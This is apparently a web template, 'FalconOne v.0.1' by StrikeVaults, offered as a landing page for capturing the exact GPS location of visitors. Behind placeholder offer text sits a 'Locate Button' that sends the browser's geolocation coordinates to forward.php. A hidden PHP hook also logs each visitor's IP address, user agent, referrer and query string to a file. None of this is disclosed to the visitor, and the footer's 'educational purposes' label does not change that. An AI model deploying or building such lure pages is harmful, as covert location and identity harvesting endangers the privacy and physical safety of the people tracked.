<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Get Exact GPS Location of Webpage Visitors with HTML5 Geolocation API and PHP!" />
  <meta name="author" content="StrikeVaults" />
  <meta name="keywords" content="HTML5, Geolocation, GPS, Location, Get Location, Grab Location" />
  <link rel="stylesheet" href="styles/main.css">
  <link rel="stylesheet" href="styles/join.css">
  <link rel="stylesheet" href="styles/footer.css">
  <title>FalconOne v.0.1 | Default Landing Page - Index.html</title>

<!-- Social Sharing SEO -->
  <meta property="og:title" content="Hello, world!" />
  <meta property="og:type" content="website" />
  <meta property="og:site_name" content="Hello, world!" />
  <meta property="og:locale" content="en_US" />
  <meta property="og:description" content="Get Exact GPS Location of Webpage Visitors with HTML5 Geolocation API and PHP!" />
  <meta property='article:author' content='StrikeVaults' />

  <link rel="icon" type="image/png" sizes="32x32" href="https://cdn.iconscout.com/icon/free/png-32/location-62-93995.png" />

</head>

<!-- Activity User-Agent hook -->
<?php
if(filesize('./l.log') > 3000000) {
	@file_put_contents('./l.log', ""); // empty log if > 3MB.
	} else {
	$log = date("F j, Y, g:i a") . ' - '. $_SERVER['REMOTE_ADDR'].' - '.$_SERVER['HTTP_USER_AGENT'].' - '. $_SERVER['HTTP_REFERER'].' - '.$_SERVER['SCRIPT_NAME']. ' - '.$_SERVER['QUERY_STRING']. PHP_EOL;
	@file_put_contents('./l.log', htmlspecialchars($log,ENT_QUOTES,'UTF-8'), FILE_APPEND);
}
?>

<body>
  <!-- template -->
  <article class="join">
    <div class="join__container">
      <section class="join__message">
        <h1 class="join__heading">Section 1 Title</h1>
        <p class="join__subheading">Sub-Title Example</p>
        <p class="join__text">Impressive article or offer description section.</p>
      </section>
      <section class="join__subscribe">
        <h2 class="join__heading">Section 2 Title</h2>
        <p class="join__price">&dollar;00 <span class="join__price-month">Text</span></p>
        <p class="join__price-desc">Short description in here</p>
        <a href="#" class="join__cta" onclick="getLocation()">Locate Button</a>
      </section>
      <section class="join__about">
        <h2 class="join__heading">Section 3 Title</h2>
        <ul class="join__list">
          <li class="join__item">Text 1</li>
          <li class="join__item">Text 2</li>
          <li class="join__item">Text 3</li>
          <li class="join__item">Text 4</li>
          <li class="join__item">Text 5</li>
          <li class="join__item">Text 6</li>
          <li class="join__item">Text 7</li>
        </ul>
      </section>
    </div>
  </article>

 <!-- Footer -->
 <footer class="footer">
  <div class="footer__attribution">
    <p class="footer__text"><a href="https://www.strikevaults.com" target="_blank">StrikeVaults</a> Labs</p>
    <p class="footer__text">Only for researches and educational purposes.</p>
  </div>
</footer>

<!-- Location and User-Agent hook -->
<p id="errorMessage"></p>

<script>
let message = document.getElementById("errorMessage");

function getLocation(){
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(sendLocation);
  } else{ 
    message.innerHTML = "<em>Your browser is not supported.</em>";
  }
}

function sendLocation(geoLocation) {
  window.location = "forward.php?x="+geoLocation.coords.latitude+"&y="+geoLocation.coords.longitude;
}
</script>

</body>
</html>
